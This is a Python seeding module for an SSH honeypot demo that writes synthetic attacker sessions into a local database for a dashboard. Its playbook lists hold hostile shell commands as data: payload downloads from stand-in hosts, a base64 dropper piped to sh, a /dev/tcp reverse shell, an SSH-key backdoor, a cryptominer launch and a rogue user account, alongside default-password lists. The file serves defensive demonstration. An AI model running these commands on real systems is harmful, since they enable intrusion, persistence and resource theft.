"""
Synthetic attack data for demos (local demo script and the public demo dashboard).

Sessions are replayed through the real fake shell + analyzer, so threat scores,
tags and IOCs are produced exactly as they would be for live traffic. Every
source IP comes from the RFC 5737 documentation ranges: none are real hosts.
"""

from __future__ import annotations

import base64
import random
import sqlite3

from .config import HoneypotSettings
from .database import EventStore
from .fake_shell import FakeShell
from .server import SessionContext, _record_command

# RFC 5737 documentation ranges: guaranteed not to be real hosts.
DEMO_IPS = (
    [f"198.51.100.{i}" for i in (7, 23, 45, 88, 131, 172)]
    + [f"203.0.113.{i}" for i in (9, 14, 77, 150, 201)]
    + [f"192.0.2.{i}" for i in (3, 66, 120, 240)]
)
IP_WEIGHTS = [14, 9, 7, 6, 5, 3, 12, 8, 4, 3, 2, 6, 3, 2, 1]
# Attacker personas so the threat levels look like real traffic:
BRUTE_ONLY = {"192.0.2.3", "192.0.2.66", "198.51.100.172", "203.0.113.201"}  # never get in
RECON_ONLY = {"198.51.100.88", "192.0.2.120"}  # get in, only fingerprint the box
CLIENTS = [
    "SSH-2.0-Go",
    "SSH-2.0-libssh2_1.10.0",
    "SSH-2.0-paramiko_3.4.0",
    "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
    "SSH-2.0-PuTTY_Release_0.80",
    "SSH-2.0-libssh_0.9.6",
]
USERS = ["root"] * 8 + ["admin", "admin", "ubuntu", "pi", "test", "oracle", "postgres", "user", "git", "support"]
PASSWORDS = [
    "123456", "password", "admin", "root", "12345678", "qwerty", "1q2w3e4r", "toor", "raspberry",
    "ubnt", "test", "P@ssw0rd", "123123", "changeme", "admin123", "1234", "111111", "abc123",
]  # fmt: skip

_DROPPER = base64.b64encode(b"cd /tmp; wget http://203.0.113.50/b.sh; chmod +x b.sh; ./b.sh").decode()
RECON = ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m", "w"]
PLAYBOOKS = [
    RECON,
    ["cd /tmp", "wget http://198.51.100.23/bins/x86.sh", "chmod +x x86.sh", "./x86.sh", "history -c"],
    ["cat /etc/passwd", "echo 'ssh-rsa AAAAB3Nza... attacker' >> ~/.ssh/authorized_keys", "crontab -l"],
    ["curl -s http://203.0.113.50/xmrig -o /tmp/.x", "nohup /tmp/.x -o stratum+tcp://pool.example:3333 &"],
    ["/bin/busybox ECCHI", "enable", "system", "shell", "sh"],
    ["bash -i >& /dev/tcp/192.0.2.10/4444 0>&1"],
    [f"echo {_DROPPER} | base64 -d | sh", "rm -rf /tmp/b.sh"],
    ["uname -a; nproc; free -m | grep Mem | awk '{print $2}'", "cat /proc/cpuinfo | grep name | wc -l"],
    ["cd /tmp || cd /var/tmp", "curl -fsSL http://198.51.100.200/kinsing -o k", "chmod 777 k", "./k"],
    ["useradd -m -s /bin/bash sysadm", "echo 'sysadm:Passw0rd!' | chpasswd", "iptables -F", "history -c"],
    ["ls -la", "cat /etc/os-release", "ps aux", "exit"],
]


def seed(settings: HoneypotSettings, sessions: int, rng_seed: int = 1337) -> None:
    """Write ``sessions`` synthetic attack sessions, spread over the last 24 hours."""
    rng = random.Random(rng_seed)
    store = EventStore(settings.db_path, settings.jsonl_file if settings.jsonl_enabled else None)
    for _ in range(sessions):
        ip = rng.choices(DEMO_IPS, weights=IP_WEIGHTS)[0]
        sid = store.create_session(ip, rng.randint(30000, 65000))
        ctx = SessionContext(sid=sid, ip=ip, port=22, store=store, settings=settings)
        if rng.random() < 0.15:  # port scanner: no SSH handshake at all
            store.end_session(sid, rng.uniform(0.1, 1.0), "handshake_failed")
            continue
        store.set_client_version(sid, rng.choice(CLIENTS))
        user = ""
        for attempt in range(rng.randint(1, 6)):
            user, pwd = rng.choice(USERS), rng.choice(PASSWORDS)
            ok = ip not in BRUTE_ONLY and (
                (user, pwd) in settings.accepted_creds or (attempt >= 2 and rng.random() < 0.2)
            )
            store.log_auth(sid, ip, "password", user, ok, password=pwd)
            if ok:
                ctx.logged_in = True
                store.mark_login(sid, user, pwd)
                break
        if not ctx.logged_in:
            store.end_session(sid, rng.uniform(0.3, 8), "auth_failed")
            continue
        shell = FakeShell(user, settings.hostname, ip)
        playbook = RECON if ip in RECON_ONLY else rng.choice(PLAYBOOKS)
        for line in playbook:
            _record_command(ctx, shell, line, "shell")
        store.end_session(sid, rng.uniform(4, 180), "logout")
    store.close()

    # spread the seeded sessions over the last 24 hours so the timeline has shape
    conn = sqlite3.connect(settings.db_path)
    for (sid,) in conn.execute("SELECT id FROM sessions WHERE src_ip != '127.0.0.1'").fetchall():
        shift = f"-{rng.randint(5, 23 * 60 + 50)} minutes"
        conn.execute(
            "UPDATE sessions SET started_at = datetime(started_at, ?), ended_at = datetime(ended_at, ?) WHERE id = ?",
            (shift, shift, sid),
        )
        conn.execute(  # make ended_at consistent with the recorded duration
            "UPDATE sessions SET ended_at = datetime(started_at, '+' || CAST(duration AS INTEGER) || ' seconds') "
            "WHERE id = ?",
            (sid,),
        )
        for table in ("auth_attempts", "commands", "iocs"):
            conn.execute(f"UPDATE {table} SET ts = datetime(ts, ?) WHERE session_id = ?", (shift, sid))
    conn.commit()
    conn.close()
